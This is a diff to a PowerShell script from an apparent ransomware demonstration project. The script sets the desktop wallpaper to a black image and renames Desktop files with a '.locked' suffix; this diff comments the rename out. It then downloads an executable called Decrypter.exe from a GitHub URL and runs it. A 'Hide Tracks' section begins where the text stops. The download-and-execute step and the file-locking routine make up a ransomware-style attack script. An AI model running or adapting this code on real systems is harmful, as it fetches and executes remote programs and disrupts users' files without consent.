@@ -1,8 +1,6 @@
 # Changes Background  
 $url = "https://www.solidbackgrounds.com/images/3840x2160/3840x2160-black-solid-color-background.jpg"
-
-Invoke-WebRequest $url -OutFile C:\Windows\Temp\black.jpg 
-
+Invoke-WebRequest $url -OutFile "$env:TEMP\black.jpg"
 $setwallpapersrc = @"
 using System.Runtime.InteropServices;
 
@@ -20,21 +18,15 @@ public class Wallpaper
 }
 "@
 Add-Type -TypeDefinition $setwallpapersrc
-
-[Wallpaper]::SetWallpaper("C:\Windows\Temp\black.jpg")
+[Wallpaper]::SetWallpaper("$env:TEMP\black.jpg")
 
 # Rename Files
-Get-ChildItem $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".locked"}
+#Get-ChildItem $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".locked"}
 
 # Download and execute Decrypter
 $url = "https://raw.githubusercontent.com/V4T3X/RansomwareDemo/refs/heads/main/Decrypter.exe"
-
-$desktopPath = [System.Environment]::GetFolderPath('Desktop')
-
-$targetPath = Join-Path -Path $desktopPath -ChildPath "Decrypter.exe"
-
+$targetPath = "$HOME\Desktop\Decrypter.exe"
 Invoke-WebRequest -Uri $url -OutFile $targetPath
-
 Start-Process -FilePath $targetPath
 
 # Hide Tracks
